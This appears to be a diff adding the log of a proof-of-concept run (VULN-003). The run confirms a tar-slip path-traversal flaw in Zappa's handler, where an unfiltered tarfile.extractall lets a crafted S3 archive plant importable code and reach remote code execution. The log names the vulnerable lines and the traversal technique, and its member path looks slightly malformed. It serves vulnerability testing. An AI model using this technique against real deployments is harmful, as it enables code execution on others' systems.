@@ -1,0 +1,11 @@
+==========================================================================
+VULN-003: tarfile.extractall tar-slip on the S3 project archive
+target : http://localhost:22571
+[INFO] exercising: zappa/handler.py:233-234 (extractall, no filter) + :237 sys.path.insert
+==========================================================================
+[STEP] feeding load_remote_project_archive a gzip tar whose member traverses '../' out of the project dir
+[INFO] intended-outside target: /tmp/zappa_tarslip_8bd52683/PWNED.py
+[INFO] escaped write occurred : True; content='# code planted outside project_folder by tar-slip -> lands on sys.path'
+[PROOF] the archive member '../../..PWNED.py' was extracted to /tmp/zappa_tarslip_8bd52683/PWNED.py — OUTSIDE project_folder — because extractall runs with no filter/path check. Since project_folder is added to sys.path, an attacker controlling the S3 archive plants importable code -> cold-start RCE. (Python 3.12 emits only a DeprecationWarning.)
+[OK] exploit confirmed — tar-slip writes outside the extraction directory
+==> VULN-003: CONFIRMED — tarfile.extractall traversal writes outside project_folder
